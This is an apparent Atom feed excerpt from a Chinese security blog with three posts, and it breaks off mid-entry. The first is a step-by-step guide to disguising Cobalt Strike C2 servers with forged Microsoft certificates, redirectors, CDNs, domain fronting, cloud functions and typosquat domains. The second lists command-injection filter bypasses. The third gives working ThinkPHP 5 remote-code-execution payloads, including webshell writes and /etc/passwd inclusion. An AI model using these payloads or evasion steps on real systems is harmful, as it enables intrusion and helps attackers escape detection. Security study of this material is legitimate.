  <entry>
    <title>检测与隐藏Cobaltstrike服务器</title>
    <link href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-12-16T01:38:12.000Z</published>
    <updated>2020-12-31T12:47:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文是对CS服务器检测与隐藏方法的学习总结，介绍检测方法的同时浅析相应隐藏方法的原理，并动手一步一步的修改相应特征值，搭建出一个不易被标记的基础服务器。</p><h2 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h2><p>CS服务器默认监听在50050端口，可以在启动前编辑<code>teamserver</code>文件更改监听端口：</p><p><code>sed -i &#39;s/50050/10080/g&#39; teamserver</code></p><ul><li>至于能不能有一点卵用就见仁见智了，只能说类似于将Tomcat从8080改到9090</li></ul><h2 id="默认证书"><a href="#默认证书" class="headerlink" title="默认证书"></a>默认证书</h2><p>接着进行全端口扫描，看到默认证书中存在CS证书签发者的相关信息，我们可以用keytool重签一个伪造的证书。</p><p><img src="/img/jcyyccss_a.png"></p><p><code>keytool</code>是一个装好JDK就会有的Java证书管理工具，输入命令<code>keytool -list -v -keystore cobaltstrike.store -storepass 123456</code>详细列出证书各条目信息。</p><p><img src="/img/jcyyccss_b.png"></p><p>然后删除默认的并重签一个伪造证书，重启CS后再用<code>nmap -p- -A -vv</code>扫描时已经消除该特征。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm ./cobaltstrike.store</span><br><span class="line">sed -i <span class="string">&#x27;s!-alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;!-alias microsoft.com -dname &quot;CN=Microsoft Windows, OU=MOPR, O=Microsoft Corporation, L=Redmond, ST=Washington, C=US&quot;!g&#x27;</span> teamserver</span><br></pre></td></tr></table></figure><p><img src="/img/jcyyccss_c.png"></p><h2 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h2><p>改了远控服务端证书后，抓包可以发现通过HTTPS的Beacon上线机器用的证书并不是同一个，而且同样存在可被识别的固定特征。</p><p><img src="/img/jcyyccss_w.png"></p><p><img src="/img/jcyyccss_x.png"></p><p>可以向<code>Let&#39;s Encrypt</code>申请一个免费证书并打包为keystore，用来替换CS自带的https证书。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 申请免费证书</span></span><br><span class="line">apt install certbot</span><br><span class="line">certbot certonly --standalone -d update.domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将证书打包并生成store文件</span></span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -<span class="keyword">in</span> /etc/letsencrypt/live/update.domain.com/fullchain.pem -inkey /etc/letsencrypt/live/update.domain.com/privkey.pem -out update.domain.com.p12 -name update.domain.com -passout pass:123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore update.domain.com.store -srckeystore update.domain.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -<span class="built_in">alias</span> update.domain.com</span><br></pre></td></tr></table></figure><p>接下来就需要用到<a href="https://www.cobaltstrike.com/help-malleable-c2">Malleable C2 profile</a>来引入我们自己申请的证书。以<code>amazon.profile</code>为例，将刚才生成的store文件放到CS目录下，向<code>amazon.profile</code>文件追加证书配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">https-certificate &#123;</span></span><br><span class="line"><span class="string">    set keystore &quot;update.domain.com.store&quot;;</span></span><br><span class="line"><span class="string">    set password &quot;123456&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺带把dns_idle和stager路径也改了</span></span><br><span class="line">sed -i <span class="string">&#x27;11i\set dns_idle &quot;8.8.8.8&quot;;&#x27;</span> amazon.profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">http-stager &#123;</span></span><br><span class="line"><span class="string">    set uri_x86 &quot;/jquery.min.js&quot;;</span></span><br><span class="line"><span class="string">    set uri_x64 &quot;/jquery.debug.js&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查配置文件有效性</span></span><br><span class="line">./c2lint amazon.profile</span><br></pre></td></tr></table></figure><p><img src="/img/jcyyccss_y.png"></p><p>再通过<code>nohup ./teamserver IP password amazon.profile &amp;</code>启动后抓上线包，证书就是自己申请的了</p><hr><p>经过以上修改后虽然起到了一定的伪装效果，但在投递Payload、Beacon监听、会话回连等过程中，马被杀被分析、Beacon的Listener被主动扫描、流量触发WAF/IDS规则都可能让C2服务器等基础设施难逃被标记的命运，这时我们可以拉一个靠山（云）或是临时工（VPS）顶在前面，使得CS服务器从风暴前线转移到相对安全的后方阵地。</p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>就像nginx反向代理会隐藏后端的tomcat等应用服务器一样，我们可以开一个按时付费、随时能销毁的机器充当临时工，它作为一个中间人转发马和CS服务器相应端口的流量。但要注意的是需要给CS服务器所在机器加上白名单防火墙，只放行临时工机器的IP。</p><ul><li>当然也有个缺点就是CS操作界面的外部IP就都会是临时工的IP了，可以设置<code>trust_x_forwarded_for</code>头或通过目标向Log平台发起请求等方法获取真实IP</li></ul><p><img src="/img/jcyyccss_d.png"></p><p>图是CS手册里的，暂时不必搞这么多分工和分级，先搭建一个简单的<code>目标机器 &lt;-&gt; 临时工 &lt;-&gt; CS服务器</code>这种拓扑的环境。</p><p>I. 设置CS服务器所在机器的白名单防火墙</p><p><img src="/img/jcyyccss_e.png"></p><p>II. 在临时工机器上安装socat并进行端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt install socat</span><br><span class="line"></span><br><span class="line">socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 &amp;</span><br><span class="line">socat TCP4-LISTEN:443,fork TCP4:1.1.1.1:443 &amp;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可用 netstat -pantu | grep socat 查看后台转发的端口，kill PID 中止转发</span></span><br></pre></td></tr></table></figure><p>III. 创建CS的Listener，设置回连地址为临时工的IP</p><p><img src="/img/jcyyccss_f.png"></p><p>IV. 向目标投递马子并执行，然后坐等上线即可</p><ul><li>此外还有一些专门做转发比如微林之类的</li></ul><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>简单的CDN转发其实就是临时工角色从自己开的VPS变成了Cloudflare、XX云等厂商而已，只需要将域名ns记录给到对应的CDN厂商，之后马儿通过域名上线即可。注意一下CS服务器所在机器的防火墙白名单，要设置为CDN厂商的段（没有预设的话就自己搜集一下）。</p><p><img src="/img/jcyyccss_g.png"></p><p>这个的好处就是，相比自己开的临时工VPS依然可能被标记/被封，CDN厂商IP服务的站会很多，威胁情报要规避误报不太可能把CDN都拉黑。。。下面简述一下在freenom注册域名并且走Cloudflare CDN上线的流程。</p><p>I. 在freenom嫖一个免费域名，不用付费也规避了资金溯源</p><p>II. 将域名的NS记录设置为CF提供的</p><p><img src="/img/jcyyccss_h.png"></p><p>III. 等DNS缓存刷新后，通过域名上线即可</p><p><img src="/img/jcyyccss_i.png"></p><ul><li>要注意在<code>DNS-&gt;配置</code>中开启<code>开发模式</code>用来取消缓存（每次3小时），否则可能会只有心跳但执行不了命令。其次CloudFlare免费套餐限定了<a href="https://support.cloudflare.com/hc/en-us/articles/200169156-Identifying-network-ports-compatible-with-Cloudflare-s-proxy">http/https能用的端口</a></li></ul><h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3><p>在介绍域前置是什么之前，我们先思考一个问题：CDN一个IP对应多个站点，它是怎么知道到底每个请求要回源到哪个站点的。答案就是根据HTTP的Host请求头来区分，举个例子：</p><ul><li>a.com 用了CDN 1.2.3.4</li><li>b.net 也用了CDN 1.2.3.4</li></ul><p>我们通过<code>curl -v &#39;a.com&#39; -H &#39;b.net&#39;</code>最终访问的也是<code>b.net</code>，因为<code>a.com</code>的DNS会解析到<code>1.2.3.4</code>，而CDN是根据Host来判断的。</p><p>因此就可以在CDN中配置回源IP为CS所在服务器，并将加速域名设置为 <code>在该CDN提供商这里尚未被占用的</code> 高可信白名单子域名（例如systemupdate.microsoft.com）</p><p>但是，真的是这样嘛？</p><p>放在以前，甚至半年前都是可行的。很多CDN提供商都不需要校验加速域名的所有权，或是如果回源IP为自家产品就不需要校验。但是现在以前常说的<code>CloudFront、Azure、CloudFlare、阿里云</code>等厂商都需要<a href="https://help.aliyun.com/document_detail/169377.html?spm=5176.11785003.overview.3.704c142fjv5nwd">验证域名归属权</a>了，需要向加速域名添加CNAME、TXT等记录来证明所有权，这样基本也就断了这条路子。</p><p>还有点小想法就是利用某些有子域控制权的服务、拿下一些软柿子DNS控制权、或者退而求其次注册些形如<code>mlcrosoft</code>的域名骗骗视力不好的管理员。</p><ul><li>也许还有不需要验证或是能Bypass的，只是笔者还没发现或是get到姿势</li></ul><h3 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h3><p>云函数简单的说就是云服务厂商已经搭建好了多种语言执行环境，我们只需要把代码通过Web传上去（或是在线编辑）就能执行。部署在云上自带CDN特效，只需要跑个转发代码就能被当作转发器用，即<code>目标机器 &lt;-&gt; 云函数CDN &lt;-&gt; CS服务器</code>。</p><p><img src="/img/jcyyccss_j.png"></p><p>各个厂商的云函数部署大同小异，具体方法可参考各家的文档。笔者特意测试了CS4.0是能正常上线并执行命令的，并不是一定得用CS4.1。除此之外中间其实踩了不少坑，挑几个可能比较普适的聊一下QAQ。</p><p><img src="/img/jcyyccss_k.png"></p><p>I. 首先编写转发代码时，URL后不要再加斜杠<code>/</code>了，不然到了CS那可能会成双斜杠<code>//</code>，转发的协议也要跟CS的Listener类型要对得上。比如位于<code>1.1.1.1</code>机器上的CS有一个https的Listener，那转发代码的URL就要写成<code>https://1.1.1.1</code></p><p>II. 为了用自己搞的HTTPS证书就会要套profile，如果在<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a>的基础上改，一定要修改或是注释掉里面<code>header &quot;Host&quot;</code>部分。至于原因，想想之前介绍的CDN如何区分不同站点就明白了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/header &quot;Host&quot;/#header &quot;Host&quot;/g&#x27;</span> amazon.profile</span><br></pre></td></tr></table></figure><p>III. 云函数会有 前端/后端 请求超时时间，建议把这个秒数稍微调大点，不然stage的马可能来不及走完流程就被挂了。</p><h2 id="stager"><a href="#stager" class="headerlink" title="stager"></a>stager</h2><p>CS的stage马上线时，默认会向一个符合checksum8规则的路径发起请求，随后服务器会响应各种Payload数据。checksum8规则路径大概就长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;x9cI&#x2F;</span><br><span class="line">&#x2F;fYKR&#x2F;</span><br><span class="line">&#x2F;Mrm0&#x2F;</span><br><span class="line">&#x2F;wQPD&#x2F;</span><br><span class="line">&#x2F;yDHX&#x2F;</span><br><span class="line">&#x2F;BCre&#x2F;</span><br><span class="line">&#x2F;WHVh&#x2F;</span><br></pre></td></tr></table></figure><p>在profile中配置<code>http-stager</code>可以改变stage马的默认请求路径：</p><p><img src="/img/jcyyccss_l.png"></p><p>但这并不会让之前的默认规则失效，此时通过checksum8规则路径依然是可以正常上线执行命令的。</p><p><img src="/img/jcyyccss_m.png"></p><p>我们在浏览器中手动访问该路径会下载一个文件，随后可以利用固定的抑或密钥将其解密看个光光。</p><p><img src="/img/jcyyccss_n.png"></p><p>解决这个问题最方便的办法就是用完就把stager给kill掉，用的时候再编辑下Listener并保存就会重新开起来。</p><p><img src="/img/jcyyccss_o.png"></p><p>比较一劳永逸的办法就是反编译出class修改抑或字节并重新加密替换回去。已经有师傅改好了现成的，不过<code>0x3e</code>这个抑或字节迟早也会被加入解密全家桶，所以还是得团队自己改好一个自用的并将知道密钥的人咩口（误。之后再用<code>grab_beacon_config.nse</code>脚本去扫描，因为抑或密钥变了自然也就解析不出了。</p><p><img src="/img/jcyyccss_p.png"></p><h2 id="JA3-S-amp-JARM"><a href="#JA3-S-amp-JARM" class="headerlink" title="JA3/S &amp; JARM"></a>JA3/S &amp; JARM</h2><p>这是一类根据Java版本、Web服务器、TLS版本等多因素TLS握手包生成指纹的方法，具体介绍及工具可参考<a href="https://github.com/salesforce/jarm">jarm</a>。</p><p>目前主要用于识别的CS的JARM指纹是<code>07d2ad16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1</code>，利用这个指纹去识别其实也会包含不少像Tomcat、Weblogic这类的JavaWeb服务器。且该指纹是基于JDK11，如果用JDK13去跑CS则会得到不一样的指纹。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据对CS服务器的识别方式，主要可以分为主动扫描和被动识别，同时对每种标记方法介绍了相应的隐藏方法。像端口转发、CDN这类方法其实也可以组合使用，不过从实测的速度来看效果会很不理想。除此以外还有一些小套路比如让上线用的域名泛解析到同行（逃，像CloudFlare这种免费套餐不允许设置泛解析的就多加几条记录。</p><p>对于防守方来说，除了利用上述方法去识别没捂严实的CS服务器，可以考虑利用checksum8规则的特点给CS服务器疯狂假上线干扰攻击队，或者直接给各大杀软和沙箱批量交样本:(</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/1349/">Cobalt Strike 绕过流量审计</a></p><p><a href="http://www.feidao.site/wordpress/?p=4457">CobaltStrike流量规避和cdn配置</a></p><p><a href="https://blog.csdn.net/qq_38376348/article/details/108027233">使用CobaltStrike搭建域前置</a></p><p><a href="https://www.anquanke.com/post/id/195011">基于国内某云的 Domain Fronting 技术实践</a></p><p><a href="https://lmntrix.com/lab/lmntrix-labs-hiding-in-plain-sight-with-reflective-injection-and-domain-fronting/">Reflective Injection And Domain Fronting</a></p><p><a href="https://www.anquanke.com/post/id/224535">浅析CobaltStrike Beacon Staging Server扫描</a></p><p><a href="https://mp.weixin.qq.com/s/fhcTTWV4Ddz4h9KxHVRcnw">Bypass cobaltstrike beacon config scan</a></p><p><a href="https://sysopfb.github.io/malware,/cobaltstrike/2020/03/24/beacon-in-azure.html">Hiding in the clouds</a></p><p><a href="https://github.com/Sentinel-One/CobaltStrikeParser">CobaltStrikeParser</a></p><p><a href="https://mp.weixin.qq.com/s/hz9lZidZXgbPrkI32pCdVQ">关于CobaltStrike的Stager被扫问题</a></p><p><a href="https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/">Analyzing Cobalt Strike for Fun and Profit</a></p><p><a href="https://blog.cobaltstrike.com/2020/12/08/a-red-teamer-plays-with-jarm/">A Red Teamer Plays with JARM</a></p><p><a href="https://www.anquanke.com/post/id/225627">利用JARM指纹进行TLS服务端标记</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文是对CS服务器检测与隐藏方法的学习总结，介绍检测方法的同时浅析相应隐藏方法的原理，并动手一步一步的修改相应特征值，搭建出一个不易被标记的基础服务器。&lt;/p&gt;
&lt;h2 id=&quot;默认端口&quot;&gt;&lt;a href=&quot;#默认端口&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="cs" scheme="https://hosch3n.github.io/tags/cs/"/>
    
    <category term="检测" scheme="https://hosch3n.github.io/tags/%E6%A3%80%E6%B5%8B/"/>
    
    <category term="伪装" scheme="https://hosch3n.github.io/tags/%E4%BC%AA%E8%A3%85/"/>
    
    <category term="端口" scheme="https://hosch3n.github.io/tags/%E7%AB%AF%E5%8F%A3/"/>
    
    <category term="tls" scheme="https://hosch3n.github.io/tags/tls/"/>
    
    <category term="cdn" scheme="https://hosch3n.github.io/tags/cdn/"/>
    
    <category term="stage" scheme="https://hosch3n.github.io/tags/stage/"/>
    
    <category term="ja3" scheme="https://hosch3n.github.io/tags/ja3/"/>
    
    <category term="jarm" scheme="https://hosch3n.github.io/tags/jarm/"/>
    
  </entry>
  
  <entry>
    <title>Linux命令注入Bypass过滤</title>
    <link href="https://hosch3n.github.io/2020/11/21/Linux%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E8%BF%87%E6%BB%A4/"/>
    <id>https://hosch3n.github.io/2020/11/21/Linux%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E8%BF%87%E6%BB%A4/</id>
    <published>2020-11-21T02:56:10.000Z</published>
    <updated>2021-01-17T05:44:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p><code>$&#123;IFS&#125;</code>在<code>man bash</code>手册中有介绍。它是一个字符串类型的分隔符集合，顾名思义就是用来定义分隔符的内置变量。通过<code>echo -n &quot;$IFS&quot; | hexdump</code>可以看到十六进制编码后的内部值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$IFS</span>&quot;</span> | hexdump</span><br><span class="line">0000000 0920 000a                              </span><br><span class="line">0000003</span><br></pre></td></tr></table></figure><p>不同的Linux发行版略有差异，主要是<code>0x09（\t）</code>、<code>0x20（空格）</code>、<code>0x0a（\n）</code>这三个默认值顺序的不同。它们三兄弟虽然紧挨在一起，但都是单独地起作用（即没有用来分割分隔符的分隔符）。IFS的值与<code>$*</code>、<code>$@</code>等内置变量也关系密切，通过将IFS赋空（NULL）可以实现一些特殊效果。在绕过时可以配合<code>$9</code>这个特殊空字符串</p><ul><li>重定向符：<code>cat&lt;&gt;flag</code>、<code>cat&lt;flag</code></li></ul><h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>灵活运用<code>&amp;</code>、<code>|</code>、<code>&amp;&amp;</code>、<code>||</code>、<code>;</code>、<code>%0a（\n）</code>、<code>:</code>等符号</p><h2 id="过滤斜杠"><a href="#过滤斜杠" class="headerlink" title="过滤斜杠"></a>过滤斜杠</h2><p>用<code>cd</code>配合命令分隔符</p><p>通过grep递归查找：<code>grep -ri . flag</code></p><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><p>假设过滤<code>cat</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">`c<span class="string">&#x27;&#x27;</span>at`</span><br><span class="line"></span><br><span class="line">`c<span class="string">&quot;&quot;</span>at`</span><br><span class="line"></span><br><span class="line">```ca``t```</span><br><span class="line"></span><br><span class="line">`ca\t`</span><br><span class="line"></span><br><span class="line">`x=ca;y=t;<span class="variable">$x</span><span class="variable">$y</span>`</span><br><span class="line"></span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&#x27;Y2F0IGZsYWc=&#x27;</span>|base64 -d|sh`</span><br><span class="line"></span><br><span class="line">`bash -c <span class="string">&quot;&#123;echo, Y2F0IGZsYWc=&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 综合利用其它变量构造</span></span><br></pre></td></tr></table></figure><h2 id="无x权限的ELF"><a href="#无x权限的ELF" class="headerlink" title="无x权限的ELF"></a>无x权限的ELF</h2><p>利用动态加载器执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ldd readflag</span><br><span class="line"></span><br><span class="line">readelf -r readflag</span><br><span class="line"></span><br><span class="line">./lib64/ld-linux-x86-64.so.2 ./readflag</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;过滤空格&quot;&gt;&lt;a href=&quot;#过滤空格&quot; class=&quot;headerlink&quot; title=&quot;过滤空格&quot;&gt;&lt;/a&gt;过滤空格&lt;/h2&gt;&lt;p&gt;&lt;code&gt;$&amp;#123;IFS&amp;#125;&lt;/code&gt;在&lt;code&gt;man bash&lt;/code&gt;手册中有介绍。它是一个</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="linux" scheme="https://hosch3n.github.io/tags/linux/"/>
    
    <category term="bypass" scheme="https://hosch3n.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>TP5漏洞分析代码执行篇</title>
    <link href="https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/"/>
    <id>https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/</id>
    <published>2020-11-05T11:51:12.000Z</published>
    <updated>2020-12-03T05:45:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>环境搭建基础可以参考SQL注入篇和官方文档</p><h2 id="代码执行1"><a href="#代码执行1" class="headerlink" title="代码执行1"></a>代码执行1</h2><p>通过传参可以调用任意类方法，调用一些具有回调功能的函数时可以导致代码执行。</p><p>影响版本：</p><ul><li>5.0.7&lt;=ThinkPHP&lt;=5.0.22</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.1</span><br><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.0</span><br><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username             # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;runtime&#x2F;log&#x2F;202012&#x2F;02.log  # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php     # 包含任意.php文件</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.23</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">改进控制器获取</a>这个commit</p><p><img src="/img/tp5ldfxrce_a.png"></p><p>加了个限制大小写字母的过滤。从官方文档可以知道，获取控制器的方式取决于用的哪种路由模式，ThinkPHP默认无强制路由、支持兼容模式，SQL注入篇中都是用的<code>?s=/模块/控制器/方法</code>这种Payload，此处可以合理猜测能够调用到危险方法。</p><p>将源码更新为5.0.22，直接全局搜索<code>eval</code>、<code>assert</code>和<code>system</code>这类赤果果的关键词基本没得搞头，但是搜回调类、反射类的函数就会眼前一亮。</p><p><img src="/img/tp5ldfxrce_b.png"></p><p>以<code>reflect</code>为例搜到的App类（thinkphp/library/think/App.php）第一条结果就是一个静态<code>invokeFunction</code>方法，<code>invokeArgs</code>方法类似<code>call_user_func_array</code>函数，只要<code>$function</code>和<code>$args</code>可控就能实现控制任意函数和参数代码执行了。跟进<code>self::bindParams</code>方法可以看到它的作用就是获取传入的参数，通过完全限定名称的命名空间调用并无脑传参就行了。</p><p><img src="/img/tp5ldfxrce_d.png"></p><p>5.1版本的利用方法类似而且能利用的类比5.0更多，官方正则判断的修复方式就是卡了命名空间的逃逸。</p><ul><li><code>$_SERVER[&#39;PATH_INFO&#39;]</code>会将<code>\</code>转为<code>/</code></li></ul><h2 id="代码执行2"><a href="#代码执行2" class="headerlink" title="代码执行2"></a>代码执行2</h2><p>影响版本：</p><ul><li>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">sss&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;route[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"># 包含任意文件</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[REQUEST_METHOD]&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 5.1.17 &lt;&#x3D; ThinkPHP5 &lt;&#x3D; 5.1.32 需要error_reporting(0);</span><br><span class="line">c&#x3D;exec&amp;f&#x3D;calc.exe&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a 